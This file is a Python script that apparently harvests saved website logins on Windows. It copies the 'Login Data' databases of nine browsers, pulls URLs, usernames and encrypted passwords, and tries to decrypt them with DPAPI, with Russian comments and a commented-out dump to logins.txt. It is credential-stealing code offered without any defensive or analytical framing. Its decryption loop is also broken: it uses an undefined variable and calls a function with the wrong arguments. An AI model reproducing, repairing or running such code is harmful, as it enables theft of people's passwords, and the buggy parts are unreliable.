# -*- coding: utf-8 -*-
"""
Created on Fri Jan 11 17:14:41 2019

"""

from ctypes import *
from ctypes.wintypes import DWORD
 
LocalFree = windll.kernel32.LocalFree
memcpy = cdll.msvcrt.memcpy
CryptProtectData = windll.crypt32.CryptProtectData
CryptUnprotectData = windll.crypt32.CryptUnprotectData
CRYPTPROTECT_UI_FORBIDDEN = 0x01
extraEntropy = "cl;ad13 \\0al;323kjd #(adl;k$#ajsd"
 
class DATA_BLOB(Structure):
    _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]
 
def getData(blobOut):
    cbData = int(blobOut.cbData)
    pbData = blobOut.pbData
    buffer = c_buffer(cbData)
    memcpy(buffer, pbData, cbData)
    LocalFree(pbData);
    return buffer.raw
 
def Win32CryptProtectData(plainText, entropy):
    bufferIn = c_buffer(plainText, len(plainText))
    blobIn = DATA_BLOB(len(plainText), bufferIn)
    bufferEntropy = c_buffer(entropy, len(entropy))
    blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)
    blobOut = DATA_BLOB()
 
    if CryptProtectData(byref(blobIn), u"python_data", byref(blobEntropy),
                       None, None, CRYPTPROTECT_UI_FORBIDDEN, byref(blobOut)):
        return getData(blobOut)
    else:
        return ""
 
def Win32CryptUnprotectData(cipherText, entropy):
    bufferIn = c_buffer(cipherText, len(cipherText))
    blobIn = DATA_BLOB(len(cipherText), bufferIn)
    bufferEntropy = c_buffer(entropy, len(entropy))
    blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)
    blobOut = DATA_BLOB()
    if CryptUnprotectData(byref(blobIn), None, byref(blobEntropy), None, None,
                              CRYPTPROTECT_UI_FORBIDDEN, byref(blobOut)):
        return getData(blobOut)
    else:
        return ""


# -*- coding: cp1251 -*-
from os.path import expanduser
from sqlite3 import connect
import os



pathusr = expanduser('~').encode().decode('cp1251')
vivaldi = pathusr + r'''\AppData\Local\Vivaldi\User Data\Default\Login Data'''
chrome = pathusr + r'''\AppData\Local\Google\Chrome\User Data\Default\Login Data'''
yandex = pathusr + r'''\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Login Data'''
opera = pathusr + r'''\AppData\Roaming\Opera Software\Opera Stable\Login Data'''
kometa = pathusr + r'''\AppData\Local\Kometa\User Data\Default\Login Data'''
orbitum = pathusr + r'''\AppData\Local\Orbitum\User Data\Default\Login Data'''
comodo = pathusr + r'''\AppData\Local\Comodo\Dragon\User Data\Default\Login Data'''
amigo = pathusr + r'''\AppData\Local\Amigo\User\User Data\Default\Login Data'''
torch = pathusr + r'''\AppData\Local\Torch\User Data\Default\Login Data'''

databases = [vivaldi, chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]



grubing_list = []
file_with_logs = "logins.txt"
coped_db = 'db'

for db in databases:
    try:
        source = open(db, 'r')
    except FileNotFoundError:
        continue
    source.close()
    source_size = os.stat(db).st_size
    copied = 0
    source = open(db, 'rb')
    target = open(coped_db, 'wb')
    while True:
        chunk = source.read(32768)
        if not chunk:
            break
        target.write(chunk)
        copied += len(chunk)

    source.close()
    target.close()

    con = connect(coped_db)
    cursor = con.cursor()

    cmd_passwords = "SELECT origin_url, username_value, password_value FROM 'logins';"
       
    cursor.execute(cmd_passwords)
        
    passwords = cursor.fetchall()
 
    con.close()


    # passwords - структура из трех полей
    # проходим по всем записям с паролями
#    browser_data = []
#    for site, login, password in passwords:
  #  p =  b"""6iIjrLSBebffOZKPQe5gdUc9qETlK1XbxAMsNGZDlorHb+Lqiw=="""

    from win32crypt import CryptUnprotectData
    import json
    for i in passwords:
        
    
        i = json.loads(str(i[2])[2:-1])
        i = i["p"]
        password = Win32CryptUnprotectData(p)
#        if password:
#            secret.append({
#                    '1': i[0],
#                    '2': i[1],
#                    '3': str(password)
#                    })
#        print(passwords[1][2].decode("UTF-8")["p"])

    # вывод записей паролей на экран

        

#        file1 = open(file_with_logs, 'w')
#        file1.writelines(var_with_logs)
#        file1.close()
#        print(var_with_logs)
    